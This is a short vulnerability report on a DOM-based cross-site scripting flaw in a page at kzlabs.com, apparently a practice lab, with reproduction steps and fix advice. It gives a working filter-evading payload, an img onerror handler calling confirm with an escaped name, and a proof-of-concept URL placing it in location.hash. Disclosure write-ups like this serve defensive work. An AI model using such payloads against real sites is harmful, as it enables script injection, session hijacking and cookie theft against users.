# DOM-Based Cross-Site Scripting (XSS) via `location.hash`

## Summary

A DOM-Based Cross-Site Scripting (XSS) vulnerability exists in the application where user-controlled data from `location.hash` is processed by client-side JavaScript without proper sanitization.

The payload executes after page refresh, leading to arbitrary JavaScript execution in the browser.

---

## Vulnerable Endpoint

```text
http://kzlabs.com/66.php
```

---

## Payload Used

```html
<iMg src=x onerror=co\u006efirm?.(1)>
```

---

## Steps to Reproduce

1. Open the following URL in a browser:

   ```text
   http://kzlabs.com/66.php#swap#xicorr<iMg src=x onerror=co\u006efirm?.(1)>
   ```

2. Refresh the page.

3. Observe that the JavaScript payload executes in the browser.

---

## Proof of Concept

```text
http://kzlabs.com/66.php#swap#xicorr<iMg src=x onerror=co\u006efirm?.(1)>
```

<img width="1920" height="1078" alt="image" src="https://github.com/user-attachments/assets/0354a53c-1892-4742-ae2e-d1d22eba1378" />

---

## Impact

* Session hijacking
* Cookie theft
* Arbitrary JavaScript execution
* DOM manipulation attacks

---

## Recommendations for Fix

* Avoid unsafe DOM sinks such as `innerHTML` and `document.write`
* Sanitize and validate `location.hash` input
* Use secure DOM APIs like `textContent`
* Implement a strict Content Security Policy (CSP)
